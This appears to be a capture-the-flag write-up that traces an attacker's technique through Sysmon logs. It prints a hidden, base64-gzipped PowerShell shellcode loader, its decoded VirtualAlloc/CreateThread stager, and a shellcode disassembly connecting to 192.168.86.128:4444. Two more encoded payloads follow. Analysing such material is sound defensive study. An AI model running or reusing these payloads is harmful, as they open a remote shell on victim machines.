# 4) Windows Log Analysis: Determine Attacker Technique
## Prompt
Using [these normalized Sysmon logs](https://downloads.elfu.org/sysmon-data.json.zip), identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.

# Solve Process

1. So for this one we search for "lsass" and find that it has started a "cmd.exe" process. That seems weird.
1. Scrolling up, we find:
    ```powershell
    if ([IntPtr]::Size -eq 4) 
    {
        $b = 'powershell.exe' 
    }
    else 
    {
        $b = $env:windir + '\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'
    }; 
    $s = New-Object System.Diagnostics.ProcessStartInfo; 
    $s.FileName = $b; 
    $s.Arguments = '-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAKne010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEniDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2etYJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mIdlNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4VqB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcwYlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KYqglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiYSDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSqDvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo9925cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLafNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKShHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvxJCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
    $s.UseShellExecute = $false;
    $s.RedirectStandardOutput = $true;
    $s.WindowStyle = 'Hidden';
    $s.CreateNoWindow = $true;
    $p = [System.Diagnostics.Process]::Start($s);
    ```
    which is compressed powershell that's being executed -> usually virus. If I had to guess, it would be the [Empire framework](https://www.powershellempire.com/) deploying , but let's do some research first. That's base64 encoded gzipped text, but let's see if we can decode it safely. I used [try it online](https://tio.run/#powershell) on just the string:
    ```
    (New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAKne010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEniDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2etYJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mIdlNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4VqB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcwYlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KYqglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiYSDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSqDvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo9925cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLafNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKShHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvxJCgAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
    ```
    which produced the result:
    ```powershell
    function uM1F {
        Param ($i46, $zVytt)		
        $vwxWO = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        return $vwxWO.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vwxWO.GetMethod('GetModuleHandle')).Invoke($null, @($i46)))), $zVytt))
    }

    function nL9 {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $kESi,
            [Parameter(Position = 1)] [Type] $mVd_U = [Void]
        )
        
        $yv = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $yv.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $kESi).SetImplementationFlags('Runtime, Managed')
        $yv.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $mVd_U, $kESi).SetImplementationFlags('Runtime, Managed')
        
        return $yv.CreateType()
    }

    [Byte[]]$dc = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
            
    $oDm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll VirtualAlloc), (nL9 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dc.Length,0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($dc, 0, $oDm, $dc.length)

    $lHZX = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll CreateThread), (nL9 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$oDm,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll WaitForSingleObject), (nL9 @([IntPtr], [Int32]))).Invoke($lHZX,0xffffffff) | Out-Null
    ```
    This is powershell that looks like it's doing some sort of shell code into memory and then running it.
    Pasting the base64 string into a hex decoder, and then pasting it into an [online disassembler](https://defuse.ca/online-x86-assembler.htm#disassembly2), we find:
    ```asm
    0:  fc                      cld
    1:  e8 82 00 00 00          call   0x88
    6:  60                      pusha
    7:  89 e5                   mov    ebp,esp
    9:  31 c0                   xor    eax,eax
    b:  64 8b 50 30             mov    edx,DWORD PTR fs:[eax+0x30]
    f:  8b 52 0c                mov    edx,DWORD PTR [edx+0xc]
    12: 8b 52 14                mov    edx,DWORD PTR [edx+0x14]
    15: 8b 72 28                mov    esi,DWORD PTR [edx+0x28]
    18: 0f b7 4a 26             movzx  ecx,WORD PTR [edx+0x26]
    1c: 31 ff                   xor    edi,edi
    1e: ac                      lods   al,BYTE PTR ds:[esi]
    1f: 3c 61                   cmp    al,0x61
    21: 7c 02                   jl     0x25
    23: 2c 20                   sub    al,0x20
    25: c1 cf 0d                ror    edi,0xd
    28: 01 c7                   add    edi,eax
    2a: e2 f2                   loop   0x1e
    2c: 52                      push   edx
    2d: 57                      push   edi
    2e: 8b 52 10                mov    edx,DWORD PTR [edx+0x10]
    31: 8b 4a 3c                mov    ecx,DWORD PTR [edx+0x3c]
    34: 8b 4c 11 78             mov    ecx,DWORD PTR [ecx+edx*1+0x78]
    38: e3 48                   jecxz  0x82
    3a: 01 d1                   add    ecx,edx
    3c: 51                      push   ecx
    3d: 8b 59 20                mov    ebx,DWORD PTR [ecx+0x20]
    40: 01 d3                   add    ebx,edx
    42: 8b 49 18                mov    ecx,DWORD PTR [ecx+0x18]
    45: e3 3a                   jecxz  0x81
    47: 49                      dec    ecx
    48: 8b 34 8b                mov    esi,DWORD PTR [ebx+ecx*4]
    4b: 01 d6                   add    esi,edx
    4d: 31 ff                   xor    edi,edi
    4f: ac                      lods   al,BYTE PTR ds:[esi]
    50: c1 cf 0d                ror    edi,0xd
    53: 01 c7                   add    edi,eax
    55: 38 e0                   cmp    al,ah
    57: 75 f6                   jne    0x4f
    59: 03 7d f8                add    edi,DWORD PTR [ebp-0x8]
    5c: 3b 7d 24                cmp    edi,DWORD PTR [ebp+0x24]
    5f: 75 e4                   jne    0x45
    61: 58                      pop    eax
    62: 8b 58 24                mov    ebx,DWORD PTR [eax+0x24]
    65: 01 d3                   add    ebx,edx
    67: 66 8b 0c 4b             mov    cx,WORD PTR [ebx+ecx*2]
    6b: 8b 58 1c                mov    ebx,DWORD PTR [eax+0x1c]
    6e: 01 d3                   add    ebx,edx
    70: 8b 04 8b                mov    eax,DWORD PTR [ebx+ecx*4]
    73: 01 d0                   add    eax,edx
    75: 89 44 24 24             mov    DWORD PTR [esp+0x24],eax
    79: 5b                      pop    ebx
    7a: 5b                      pop    ebx
    7b: 61                      popa
    7c: 59                      pop    ecx
    7d: 5a                      pop    edx
    7e: 51                      push   ecx
    7f: ff e0                   jmp    eax
    81: 5f                      pop    edi
    82: 5f                      pop    edi
    83: 5a                      pop    edx
    84: 8b 12                   mov    edx,DWORD PTR [edx]
    86: eb 8d                   jmp    0x15
    88: 5d                      pop    ebp
    89: 68 33 32 00 00          push   0x3233
    8e: 68 77 73 32 5f          push   0x5f327377
    93: 54                      push   esp
    94: 68 4c 77 26 07          push   0x726774c
    99: 89 e8                   mov    eax,ebp
    9b: ff d0                   call   eax
    9d: b8 90 01 00 00          mov    eax,0x190
    a2: 29 c4                   sub    esp,eax
    a4: 54                      push   esp
    a5: 50                      push   eax
    a6: 68 29 80 6b 00          push   0x6b8029
    ab: ff d5                   call   ebp
    ad: 6a 0a                   push   0xa
    af: 68 c0 a8 56 80          push   0x8056a8c0
    b4: 68 02 00 11 5c          push   0x5c110002
    b9: 89 e6                   mov    esi,esp
    bb: 50                      push   eax
    bc: 50                      push   eax
    bd: 50                      push   eax
    be: 50                      push   eax
    bf: 40                      inc    eax
    c0: 50                      push   eax
    c1: 40                      inc    eax
    c2: 50                      push   eax
    c3: 68 ea 0f df e0          push   0xe0df0fea
    c8: ff d5                   call   ebp
    ca: 97                      xchg   edi,eax
    cb: 6a 10                   push   0x10
    cd: 56                      push   esi
    ce: 57                      push   edi
    cf: 68 99 a5 74 61          push   0x6174a599
    d4: ff d5                   call   ebp
    d6: 85 c0                   test   eax,eax
    d8: 74 0a                   je     0xe4
    da: ff 4e 08                dec    DWORD PTR [esi+0x8]
    dd: 75 ec                   jne    0xcb
    df: e8 67 00 00 00          call   0x14b
    e4: 6a 00                   push   0x0
    e6: 6a 04                   push   0x4
    e8: 56                      push   esi
    e9: 57                      push   edi
    ea: 68 02 d9 c8 5f          push   0x5fc8d902
    ef: ff d5                   call   ebp
    f1: 83 f8 00                cmp    eax,0x0
    f4: 7e 36                   jle    0x12c
    f6: 8b 36                   mov    esi,DWORD PTR [esi]
    f8: 6a 40                   push   0x40
    fa: 68 00 10 00 00          push   0x1000
    ff: 56                      push   esi
    100:    6a 00                   push   0x0
    102:    68 58 a4 53 e5          push   0xe553a458
    107:    ff d5                   call   ebp
    109:    93                      xchg   ebx,eax
    10a:    53                      push   ebx
    10b:    6a 00                   push   0x0
    10d:    56                      push   esi
    10e:    53                      push   ebx
    10f:    57                      push   edi
    110:    68 02 d9 c8 5f          push   0x5fc8d902
    115:    ff d5                   call   ebp
    117:    83 f8 00                cmp    eax,0x0
    11a:    7d 28                   jge    0x144
    11c:    58                      pop    eax
    11d:    68 00 40 00 00          push   0x4000
    122:    6a 00                   push   0x0
    124:    50                      push   eax
    125:    68 0b 2f 0f 30          push   0x300f2f0b
    12a:    ff d5                   call   ebp
    12c:    57                      push   edi
    12d:    68 75 6e 4d 61          push   0x614d6e75
    132:    ff d5                   call   ebp
    134:    5e                      pop    esi
    135:    5e                      pop    esi
    136:    ff 0c 24                dec    DWORD PTR [esp]
    139:    0f 85 70 ff ff ff       jne    0xaf
    13f:    e9 9b ff ff ff          jmp    0xdf
    144:    01 c3                   add    ebx,eax
    146:    29 c6                   sub    esi,eax
    148:    75 c1                   jne    0x10b
    14a:    c3                      ret
    14b:    bb e0 1d 2a 0a          mov    ebx,0xa2a1de0
    150:    68 a6 95 bd 9d          push   0x9dbd95a6
    155:    ff d5                   call   ebp
    157:    3c 06                   cmp    al,0x6
    159:    7c 0a                   jl     0x165
    15b:    80 fb e0                cmp    bl,0xe0
    15e:    75 05                   jne    0x165
    160:    bb 47 13 72 6f          mov    ebx,0x6f721347
    165:    6a 00                   push   0x0
    167:    53                      push   ebx
    168:    ff d5                   call   ebp
    ```
    Funnily enough, Windows Defender starts deleting my markdown files at this point :D
    So we go to Hermey Hall to talk to SugarPlum Mary for a hint.
1. There's an ls that's not the real ls, when we run ```which ls``` we find that it's using ```/usr/localbin/ls``` instead of ```/bin/ls```... but we can call ```/bin/ls``` directly, and win the challenge. Cat-ing the file 'rejected-elfu-logos.txt' we find:
    ```
            _        
           / \
           \_/
           / \
          /   \
         /    |
        /     |
       /       \
     _/_________|_
     (____________)
    
    Get Elfed at ElfU!
    
    
      ()
      |\__/------\
      \__________/
      Walk a Mile in an elf's shoes
      Take a course at ElfU!
    
    
      ____\()/____
      |    ||    |
      |    ||    |
      |====||====|
      |    ||    |
      |    ||    |
      ------------
    Be present in class
    Fight, win, kick some grinch!
    ```
    which is irrelevant so we continue :D
1. While it seems like a whole lot of nothing (look up EQL, look up sysmon...) one of the commands proves useful:
    ```bash
    eql query -f sysmon-data.json "network where subtype = 'outgoing'" | jq
    ```
    which produces an output of:
    ```json
    {
      "destination_address": "192.168.86.128",
      "destination_port": "4444",
      "event_type": "network",
      "pid": 3588,
      "process_name": "powershell.exe",
      "process_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
      "protocol": "tcp",
      "source_address": "192.168.86.190",
      "source_port": "52395",
      "subtype": "outgoing",
      "timestamp": 132186396538670000,
      "unique_pid": "{7431d376-7e14-5d60-0000-0010f0172600}",
      "user": "NT AUTHORITY\\SYSTEM",
      "user_domain": "NT AUTHORITY",
      "user_name": "SYSTEM"
    }
    {
      "destination_address": "192.168.86.128",
      "destination_port": "4444",
      "event_type": "network",
      "pid": 4056,
      "process_name": "powershell.exe",
      "process_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
      "protocol": "tcp",
      "source_address": "192.168.86.190",
      "source_port": "52397",
      "subtype": "outgoing",
      "timestamp": 132186396953279980,
      "unique_pid": "{7431d376-de4f-5dd3-0000-0010ab8f2600}",
      "user": "NT AUTHORITY\\SYSTEM",
      "user_domain": "NT AUTHORITY",
      "user_name": "SYSTEM"
    }
    {
      "destination_address": "72.21.81.240",
      "destination_port": "80",
      "event_type": "network",
      "pid": 1148,
      "process_name": "svchost.exe",
      "process_path": "C:\\Windows\\System32\\svchost.exe",
      "protocol": "tcp",
      "source_address": "192.168.86.190",
      "source_port": "52399",
      "subtype": "outgoing",
      "timestamp": 132186397042029980,
      "unique_pid": "{7431d376-cd82-5dd3-0000-001065030100}",
      "user": "NT AUTHORITY\\NETWORK SERVICE",
      "user_domain": "NT AUTHORITY",
      "user_name": "NETWORK SERVICE"
    }
    {
      "destination_address": "72.21.91.29",
      "destination_port": "80",
      "event_type": "network",
      "pid": 2444,
      "process_name": "sysmon64.exe",
      "process_path": "C:\\Windows\\sysmon64.exe",
      "protocol": "tcp",
      "source_address": "192.168.86.190",
      "source_port": "52849",
      "subtype": "outgoing",
      "timestamp": 132186397164850000,
      "unique_pid": "{7431d376-dd81-5dd3-0000-001028ba1a00}",
      "user": "NT AUTHORITY\\SYSTEM",
      "user_domain": "NT AUTHORITY",
      "user_name": "SYSTEM"
    }
    {
      "destination_address": "192.168.86.128",
      "destination_port": "4444",
      "event_type": "network",
      "pid": 2564,
      "process_name": "powershell.exe",
      "process_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
      "protocol": "tcp",
      "source_address": "192.168.86.190",
      "source_port": "54798",
      "subtype": "outgoing",
      "timestamp": 132186397866610000,
      "unique_pid": "{7431d376-deaa-5dd3-0000-0010948f4f00}",
      "user": "NT AUTHORITY\\SYSTEM",
      "user_domain": "NT AUTHORITY",
      "user_name": "SYSTEM"
    }
    ```
    and since the port is 4444, we can assume that the attacker was using a metasploit library (4444 is the default port for listeners in metasploit). But metasploit is not the answer... so we have to dig deeper. Looking up [lsass sysmon](https://blogs.technet.microsoft.com/motiba/2017/12/07/sysinternals-sysmon-suspicious-activity-guide/) we find an official MS source of how to threat hunt with Sysmon. But we find that only file, network, process, and registry events were logged. We might have to debug those powershell nastygrams. :(
    WE end up with these 6 powershell files:
    ```powershell
    [scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIACHe010CA7VWbW/aSBD+nEj5D1aFZFshGANt2kiVbs07wQnEQCAUnTb22iysvWCvCabtf78x4DS9plV70ll5We/OzM4888yM3TiwBeWBhEsD6fPZ6UkPh9iXlBy13w3yUi5h60A9OYGDnN2VPkrKFK1WNe5jGsyurqpxGJJAHN4LTSJQFBH/kVESKar0Rbqfk5Bc3D4uiC2kz1Lu70KT8UfMjmJJFdtzIl2gwEnPutzGqS8Fa8WoUORPn2R1eqHPCvV1jFmkyFYSCeIXHMZkVfqqphcOkhVRZJPaIY+4Kwr3NCiXCsMgwi65AWsbYhIx504kqxAD/IRExGEgQTSp+uFQkWHZC7mNHCckUSTnpWlqeDqb/aVMj7fexYGgPim0A0FCvrJIuKE2iQotHDiM3BF3BlqWCGngzVQVxDZ8SZRcEDOWl/7EjHJDnjLMfldJeakEUj0RqnnI4g9RmtyJGTnoya+4uc+7Ck+We4Dt69np2ambEYWuX/IEVifT/ZqAa0qPR3Qv9VEq5iUTrsGChwm85gZhTNTZM7BSbuHkf66tZ6IguClh2JmOOHVmoHFMZM63rGa6/3NC1ohLA1JLAuxTO+Oc8hq+xGVkH14hE7sBnxT5eECcGmHEwyLFLE3zD2p1n4pnXSOmzCEhsiFHEXgF6VO/d+aQBkVuBybxAaDDO/Au5wLTSSZ9ZHeS3Z6+g5BcZTiK8lIvhlKz85JFMCNOXkJBRI9HKBZ8v5S/uWvGTFAbRyIzN1MzHI/3VXkQiTC2IWcQ+8BaEZtilkKRl1rUIUZiUS+7V34ViCpmDEoALG0gEbCTAmCJlAkhuAhZVwsWEW1/xYgPEvuKbzDsQX0fab4nDvaII//bv4zIB9amSGQQvPAO0msxLvLSiIYCGkeKKlDov9z9ol/svaiG5JgFJauLqZGIlM+5qDRItikfj5jsEQgFRN8IuW/giLyrHNqD8ka7pVUEz6QdMNM2llRHT1Rvm/A7pOU2r106151FSwtr27mL2lHbbPVq/VarsulYo4qw6m1x3WsLsz5eLCzUuhtOxEMbtQa0uJxUdqsO3Vld5Ey22rudsXsqGtvdwnPcSc11vUvXutPfNmj3vto3iiXcrdXj7r3xZBQrUZ0+tfp02F92GuJxMmJ46GreWP+A6bYbLkY6N3dthJrzsr3ruKPm3HSSSYuShVbs0j7qI3Rt3w2HTW/lNSOkfRitq/4CrRsYYdRG9VHSecuM/rBhoGHd6ONb3iuf1zT9wVnXGw9j3PGZ02xp+mSMHBRqA2+uX97OgxQn7BlrI5VB3YekoYFMr4JalRLdPaz7TQ/VQWbkc4QbdDk8H4PNmwHo3A91hyMRtMeaNvI0D7nWfIKRAdLGGjUMXk3e98yeNhqV5vrjUp+Dz2S8eW920HnD7mmadu4/wl8N2eZqG4yNp8uN17L4Nb7Go81DWdMHT00XrdH5uaEbj6JVL3c2cO9A+zD8+CYlEDAoZ/PhC1r8rJWbOIzmmAFdoEtnBdrgYePYd3ucphqKkg7qJQkDwmDQwSjMaI4Y43ba9KFBw7g5DIF0Jg1hWS69ulKlZ0H12zDItq6uHsBFqJs9tQtdEnhini9uy8UiNPfitlKEEH8/ripfJcrBVj6dDikwz8bZ3riaVlTONd/q1v8K2bGO5/DP+TVk3/Z+cfpbMBbz+4B/2P1+448Q/dOw7zEVIGhBD2LkMAFfi/7IjRdfB/uMQObd45N+293G4uIGvhrOTv8BxRZ9dEQKAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())
    [scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAE7e010CA7VWbW/aSBD+nEj9D1aFZFshGAeatJEq3Zo3m+AEYiAQik6LvTZL1jas1xDo9b/fGHCbqulde9JZeVnvzszOPPPMjP00cgWNI4nVqtLnN6cnXcxxKCmFTZo2ilIBG01PPTmBgwLD0kdJmaDlsh6HmEbT6+tayjmJxOG91CICJQkJZ4ySRFGlv6SHOeHk/G62IK6QPkuFP0stFs8wO4pta9idE+kcRV521oldnPlScpaMCkX+9ElWJ+f6tNRYpZgliuxsE0HCkseYrEpf1OzC/nZJFNmmLo+T2BelBxpVLkqDKME+uQVra2ITMY+9RFYhBvjhRKQ8kiCaTP1wqMiw7PLYRZ7HSZLIRWmSGZ5Mp38ok+Ot92kkaEhKViQIj5cO4WvqkqRk4shj5J74U9ByBKdRMFVVEFvHT0QpRCljRel3zCi3ZJNj9qtKykslkOoKrhYhiz9EacdeyshBT37FzX3eVXjy3ANsX96cvjn1c6JsguAlUWB1MtmvCfimdOOE7sU+SuWiZMM9WMR8C6+FPk+JOv2KrFTYRA/0svhzA3ouDbILGzYmw5h6U1A45rIwu8x2f87IOvFpROrbCIfUzUmnvAYw8RnZx1fKxW7BIUU+HhCvThgJsMhAy/L8g1ojpOKrrpFS5hGOXEhSAl5B/tTvnTnkQZGtyCYhAHR4B+IVfKA6yaWP9N7mt2fvICTXGE6SotRNodbcouQQzIhXlFCU0OMRSkW8X8rf3LVTJqiLE5Gbm6oHFI+31eIoETx1IWMQed9ZEpdilgFRlEzqEWPr0CC/VX4VhhpmDCoALK0hDbCThe+IjAccHDzkXC05RFjhkpEQhPY132Q4gAo/En3PHBwQT/7ewZzIB9ZmQOQIvHAPsuuwWBSlIeUCGkcG6sL+j3e/6BjgRY2TYxKUvC4mxlZkdC4wvrYyNh4x2SPABUTf5HFo4IRcVg/dQXmr3dEagmdsRcx2jSeqow3VLRt+B7RixfUr76a9MDVef577yEos2+zWe6ZZXbedYVU4DUvcdC1hN0aLhYPM+8FYPFrI7NPy07i6W7bpzukgb/ysXe6M3aZsPO8WgeeP674fXPnOvf6uSTsPtZ5RvsCdeiPtPBgbo1xNGnRj9uig99Ruitl4yPDA14KR/gHT5w5fDPXY3lkIteYVd9f2h6257W3HJiULrdyhPdRD6Ma9HwxawTJoJUj7MFzVwgVaNTHCyEKN4bb9jhm9QdNAg4bRw3dxt3JW1/RHb9VoPo5wO2Rey9T08Qh5iGv9YK5f3c2jDCccGCsjk0Gdx21TA5luFZnVC7p7XPVaAWqAzDCMEW7Sp8HZCGze9kHnYaB7MRKRNdK0YaAFyHfmY4wMkDZWqGnEte37rt3VhsOLuT570ufgMxmt39ttdNZ0u5qmnYUz+Ksh114+RyNjc7UOTCe+wTd4uH6saHp/0/LRCp2dGboxE2aj0l7DvX3tw+Dj24w9QJ/C4paIF7z4WSu3MU/mmAFfoEvn9dmMefPYd7sxzTQUJRvUT4RHhMGgg1GY0xwxFrtZ088aNMybwxTIhtIAlpWLV1eq9FVQ/TYN8q3r60fwESon43apQ6JAzIvl50q5DL29/FwtQ4y/HlctXm6VvaliNhv2wOS22d62mhVUAXuJ2f1fETuW8Rz+ef+C2Le9fzj9JRTLxUPEP2x/v/FbkP5u4A+YChB0oAsxcpiAr8Z/JMeL74N9UiD3/vHJvu7uUnF+C98Nb07/BljTPkRGCgAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())
